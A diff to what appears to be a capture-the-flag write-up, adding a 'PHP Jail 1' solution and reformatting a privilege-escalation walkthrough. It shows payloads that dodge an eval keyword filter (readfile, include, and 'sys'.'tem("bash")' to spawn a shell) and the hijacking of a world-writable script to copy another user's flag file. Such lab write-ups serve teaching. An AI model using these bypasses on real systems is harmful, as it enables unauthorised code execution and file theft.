@@ -670,6 +670,63 @@ In file included from /tmp/9868f2af-14a6-42cb-a06f-9f9916e8b294/bin.c:13:0:
  ^
  ```
 
+## PHP Jail 1
+```php
+<?php
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);
+
+if($var == null) die("PHP Jail need an argument\n");
+
+function filter($var) {
+        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
+                return false;
+        }
+        return true;
+}
+if(filter($var)) {
+        eval($var);
+        echo "Command executed";
+} else {
+        echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+```
+We see the PHP code used for the jail. That facilitates a lot of things.
+<br>
+Above the eval instruction is used to evaluate and execute the input data.
+<br>
+But some characters and keywords are prohibited for these input data.
+<br>
+However there is more than one way to solve this challenge.
+```php
+readfile('flag.txt');
+FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
+```
+```php
+include('flag.txt');
+FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
+```
+```php
+require('flag.txt');
+FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
+```
+```php
+eval('sys'.'tem("bash");');
+level1@lxc20-php-jail:~$ cat flag.txt
+FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
+```
+```php
+assert('sys'.'tem("bash")');
+level1@lxc20-php-jail:~$ cat flag.txt
+FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
+```
+
+
+
+
+
 # Forensics 
 
 ## I made a dd of Agent Smith usb key
@@ -934,8 +991,12 @@ so instead of writing ```ps aux``` output to a file in tmp we will read the flag
 morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/Gathering.py
 import os
 os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
+```
+```assembly
 morpheus@lxc-sysadmin:/home/cypher$ ls -lah /tmp/Gathering.py
 -rwxrwxrwx 1 cypher cypher 58 Aug  9 14:09 /tmp/Gathering.py
+```
+```assembly
 morpheus@lxc-sysadmin:/home/cypher$ ls -lah
 total 32K
 drwxrwxrwx 2 cypher cypher 4.0K Aug  8 12:40 .
@@ -947,15 +1008,21 @@ lrwxrwxrwx 1 root   root      9 May 30 18:08 .bash_history -> /dev/null
 -rw------- 1 cypher cypher   52 May 30 18:08 flag.txt
 -rwxrwxrwx 1 cypher cypher 5.3K Jun 23 11:46 info.txt
 -rwxrwxrwx 1 cypher cypher  675 May 30 18:08 .profile
-morpheus@lxc-sysadmin:/home/cypher$ cat flag.txt
-cat: flag.txt: Permission denied
+```
+```assembly
 morpheus@lxc-sysadmin:/home/cypher$ nano /tmp/Gathering.py
+```
+```assembly
 morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/Gathering.py
 import os
 os.system('cat /home/cypher/flag.txt > /tmp/flag.txt')
+```
+```assembly
 morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/flag.txt
 BASE ?
 RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
+```
+```assembly
 morpheus@lxc-sysadmin:/home/cypher$ echo RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego= | base64 -d
 FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
 ```
